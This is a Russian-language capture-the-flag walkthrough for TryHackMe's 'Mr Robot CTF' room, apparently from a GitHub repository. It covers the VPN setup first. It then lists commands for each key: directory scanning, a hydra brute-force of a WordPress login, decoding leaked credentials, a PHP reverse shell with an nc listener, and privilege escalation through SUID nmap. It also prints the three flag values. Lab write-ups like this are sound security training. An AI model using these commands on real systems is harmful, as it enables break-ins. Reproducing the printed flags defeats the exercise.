[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Mr Robot CTF](https://tryhackme.com/r/room/mrrobot) 

Всего 2 задания:
## Задание 1
Для развертывания виртуальной машины Mr. Robot вам сначала необходимо подключиться к нашей сети.

### Ответьте на вопросы ниже
Подключаемся к нашей сети с помощью OpenVPN. Вот мини-руководство по подключению:

Перейдите на страницу доступа и загрузите файл конфигурации.
```commandline
Ответ не нужен
```

Используйте OpenVPN-клиент для подключения. В моем примере я работаю на Linux, на странице доступа у нас есть 
руководство для Windows. 
(измените «ben.ovpn» на ваш конфигурационный файл)

При запуске вы увидите много текста, в конце будет написано Initialization Sequence Completed.
```commandline
Ответ не нужен
```
Вы можете убедиться, что вы подключены, посмотрев на страницу доступа. Обновите страницу

Вы должны увидеть зеленую галочку рядом с Connected. Она также покажет вам ваш внутренний IP-адрес.
Теперь вы готовы использовать наши машины в нашей сети!
```commandline
Ответ не нужен
```
Теперь при развертывании материала вы увидите внутренний IP-адрес вашей виртуальной машины.
```commandline
Ответ не нужен
```

## Задание 2
Можно ли получить root-доступ к этой машине в стиле Mr. Robot? Это виртуальная машина, предназначенная для 
начинающих/продвинутых пользователей. На машине есть 3 скрытых ключа, можете ли вы их найти?

Спасибо Леону Джонсону за создание этой машины. Эта машина используется здесь с явного разрешения создателя <3 

### Ответьте на вопросы ниже
Что такое ключ 1?
```commandline
nmap -sC -sV -Pn <IP>
gobuster dir --url http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
http://<IP>/robots.txt
cat robots.txt
cat password.raw-md5
# abcdefghijklmnopqrstuvwxyz
su robot
cat key-1-of-3.txt
```
```commandline
073403c8a58a1f80d943455fb30724b9
```
Что такое ключ 2?
```commandline
http://<IP>/wp-login.php
hydra -L fsocity.dic -p 123453453 {IP} http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username”
http://<IP>/license
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
# elliot:ER28–0652
https://github.com/pentestmonkey/php-reverse-shell
nc -lnvp 4444
python -c ‘import pty;pty.spawn(“/bin/bash”)’
cat /home/robot/key-2-of-3.txt
```
```commandline
822c73956184f694993bede3eb39f959
```
Что такое ключ 3?
```commandline
sudo -l
find / -perm -u=s -type f 2>/dev/null
nmap --interactive
!sh
cat key-3-of-3.txt
```
```commandline
04787ddef27c3dee1ee161b21670b4e4
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)